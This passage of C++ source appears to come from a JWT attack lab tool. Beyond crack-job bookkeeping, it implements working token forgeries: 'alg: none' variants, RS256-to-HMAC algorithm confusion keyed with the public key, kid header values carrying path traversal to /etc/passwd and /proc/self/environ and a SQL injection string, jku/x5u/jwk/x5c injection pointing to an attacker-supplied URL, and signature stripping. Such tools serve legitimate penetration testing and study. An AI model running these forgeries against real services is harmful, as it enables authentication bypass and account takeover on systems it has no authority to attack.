    diag::log_tagged_fmt("jwt_lab", "crack_stop entry id=%llu", static_cast<unsigned long long>(id));
    auto& st = s();
    std::shared_ptr<crack_record_t> rec;
    {
        std::lock_guard<std::mutex> lk(st.cracks_mtx);
        auto it = st.cracks.find(id);
        if (it != st.cracks.end()) rec = it->second;
    }
    if (rec) {
        rec->stop_requested.store(true, std::memory_order_release);
        diag::log_tagged_fmt("jwt_lab", "crack_stop signaled id=%llu", static_cast<unsigned long long>(id));
    } else {
        diag::log_tagged_fmt("jwt_lab", "crack_stop not_found id=%llu", static_cast<unsigned long long>(id));
    }
}

std::vector<crack_status_t> list_cracks()
{
    diag::log_tagged_fmt("jwt_lab", "list_cracks entry");
    auto& st = s();
    std::vector<std::shared_ptr<crack_record_t>> snap;
    {
        std::lock_guard<std::mutex> lk(st.cracks_mtx);
        snap.reserve(st.cracks.size());
        for (auto& kv : st.cracks) snap.push_back(kv.second);
    }
    diag::log_tagged_fmt("jwt_lab", "list_cracks snap_size=%zu", snap.size());
    std::vector<crack_status_t> out;
    out.reserve(snap.size());
    for (auto& rec : snap) {
        if (!rec) continue;
        crack_status_t s_out;
        s_out.id = rec->id;
        s_out.attempts = rec->attempts.load(std::memory_order_acquire);
        s_out.running = rec->running.load(std::memory_order_acquire);
        {
            std::lock_guard<std::mutex> lk(rec->found_mtx);
            s_out.secret_found = rec->secret_found;
        }
        out.push_back(std::move(s_out));
    }
    diag::log_tagged_fmt("jwt_lab", "list_cracks result count=%zu", out.size());
    return out;
}

std::vector<std::string> attack_alg_none(const std::string& token)
{
    diag::log_tagged_fmt("jwt_lab", "attack_alg_none entry token_len=%zu", token.size());
    std::vector<std::string> out;
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "attack_alg_none error invalid_structure");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "attack_alg_none original_alg=%s generating_variants", parsed.alg.c_str());
    const std::vector<std::string> variants = { "none", "None", "NONE", "nOnE" };
    for (const auto& v : variants) {
        nlohmann::json hdr = parsed.header;
        hdr["alg"] = v;
        const std::string hdr_b64 = base64url_encode(hdr.dump());
        std::string t;
        t.reserve(hdr_b64.size() + 1 + parsed.payload_b64.size() + 1);
        t.append(hdr_b64);
        t.push_back('.');
        t.append(parsed.payload_b64);
        t.push_back('.');
        out.push_back(std::move(t));
    }
    diag::log_tagged_fmt("jwt_lab", "attack_alg_none result count=%zu", out.size());
    return out;
}

std::vector<std::string> attack_alg_confusion(const std::string& token, const std::string& rsa_public_pem)
{
    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion entry token_len=%zu pem_len=%zu", token.size(), rsa_public_pem.size());
    std::vector<std::string> out;
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion error invalid_structure");
        return out;
    }
    if (rsa_public_pem.empty()) {
        diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion error empty_pem");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion original_alg=%s generating_confusion_tokens", parsed.alg.c_str());
    const std::vector<std::string> downgrade = { "HS256", "HS384", "HS512" };
    for (const auto& algv : downgrade) {
        nlohmann::json hdr = parsed.header;
        hdr["alg"] = algv;
        const std::string hdr_b64 = base64url_encode(hdr.dump());
        std::string signing_input;
        signing_input.reserve(hdr_b64.size() + 1 + parsed.payload_b64.size());
        signing_input.append(hdr_b64);
        signing_input.push_back('.');
        signing_input.append(parsed.payload_b64);
        std::vector<uint8_t> mac;
        if (!hmac_compute(sha_name_for_alg(algv),
                          reinterpret_cast<const uint8_t*>(rsa_public_pem.data()), rsa_public_pem.size(),
                          reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
            continue;
        }
        std::string forged = signing_input;
        forged.push_back('.');
        forged.append(base64url_encode(mac.data(), mac.size()));
        out.push_back(std::move(forged));

        std::string stripped_pem = rsa_public_pem;
        while (!stripped_pem.empty() && (stripped_pem.back() == '\n' || stripped_pem.back() == '\r')) stripped_pem.pop_back();
        if (stripped_pem != rsa_public_pem) {
            std::vector<uint8_t> mac2;
            if (hmac_compute(sha_name_for_alg(algv),
                             reinterpret_cast<const uint8_t*>(stripped_pem.data()), stripped_pem.size(),
                             reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac2)) {
                std::string forged2 = signing_input;
                forged2.push_back('.');
                forged2.append(base64url_encode(mac2.data(), mac2.size()));
                out.push_back(std::move(forged2));
            }
        }
    }
    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion result count=%zu", out.size());
    return out;
}

std::vector<std::string> attack_kid_traversal(const std::string& token)
{
    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal entry token_len=%zu", token.size());
    std::vector<std::string> out;
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal error invalid_structure");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal alg=%s generating_traversal_payloads", parsed.alg.c_str());
    const std::vector<std::string> kids = {
        "../../dev/null",
        "../../../../../../dev/null",
        "/dev/null",
        "../../../../../../etc/passwd",
        "../../../../../../proc/self/environ",
        "file:///dev/null",
        "..\\..\\..\\..\\..\\nul",
        "..%2f..%2f..%2fdev%2fnull",
        "' UNION SELECT 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'--"
    };
    for (const auto& kid : kids) {
        nlohmann::json hdr = parsed.header;
        hdr["kid"] = kid;
        const std::string hdr_b64 = base64url_encode(hdr.dump());
        std::string signing_input;
        signing_input.reserve(hdr_b64.size() + 1 + parsed.payload_b64.size());
        signing_input.append(hdr_b64);
        signing_input.push_back('.');
        signing_input.append(parsed.payload_b64);
        const uint8_t empty_key = 0;
        std::vector<uint8_t> mac;
        if (!hmac_compute(sha_name_for_alg(parsed.alg.empty() ? std::string("HS256") : parsed.alg),
                          &empty_key, 0,
                          reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
            continue;
        }
        std::string forged = signing_input;
        forged.push_back('.');
        forged.append(base64url_encode(mac.data(), mac.size()));
        out.push_back(std::move(forged));
    }
    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal result count=%zu", out.size());
    return out;
}

std::vector<std::string> attack_jku_injection(const std::string& token, const std::string& attacker_jku_url)
{
    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection entry token_len=%zu jku_url_len=%zu", token.size(), attacker_jku_url.size());
    std::vector<std::string> out;
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "attack_jku_injection error invalid_structure");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection alg=%s generating_jku_variants", parsed.alg.c_str());
    const std::vector<std::string> header_keys = { "jku", "x5u", "jwk", "x5c" };
    for (const auto& key : header_keys) {
        nlohmann::json hdr = parsed.header;
        if (key == "jwk") {
            nlohmann::json jwk;
            jwk["kty"] = "oct";
            jwk["k"] = base64url_encode(attacker_jku_url);
            hdr["jwk"] = jwk;
        } else if (key == "x5c") {
            hdr["x5c"] = nlohmann::json::array({ attacker_jku_url });
        } else {
            hdr[key] = attacker_jku_url;
        }
        const std::string hdr_b64 = base64url_encode(hdr.dump());
        std::string out_token;
        out_token.reserve(hdr_b64.size() + 1 + parsed.payload_b64.size() + 1 + parsed.signature_b64.size());
        out_token.append(hdr_b64);
        out_token.push_back('.');
        out_token.append(parsed.payload_b64);
        out_token.push_back('.');
        out_token.append(parsed.signature_b64);
        out.push_back(std::move(out_token));
    }
    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection result count=%zu", out.size());
    return out;
}

std::vector<std::string> attack_signature_strip(const std::string& token)
{
    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip entry token_len=%zu", token.size());
    std::vector<std::string> out;
    jwt_parsed_t parsed = decode(token);
    if (!parsed.valid_structure) {
        diag::log_tagged_fmt("jwt_lab", "attack_signature_strip error invalid_structure");
        return out;
    }
    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip alg=%s stripping_signature", parsed.alg.c_str());
    std::string t;
    t.reserve(parsed.header_b64.size() + 1 + parsed.payload_b64.size() + 1);
    t.append(parsed.header_b64);
    t.push_back('.');
    t.append(parsed.payload_b64);
    t.push_back('.');
    out.push_back(t);
    std::string t2 = parsed.header_b64;
    t2.push_back('.');
    t2.append(parsed.payload_b64);
    out.push_back(std::move(t2));
    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip result count=%zu", out.size());
    return out;
}

std::string last_error()
{
    diag::log_tagged_fmt("jwt_lab", "last_error queried");
    auto& st = s();
    std::lock_guard<std::mutex> lk(st.err_mtx);
    diag::log_tagged_fmt("jwt_lab", "last_error value_len=%zu", st.last_err.size());
    return st.last_err;
}

}
}
}
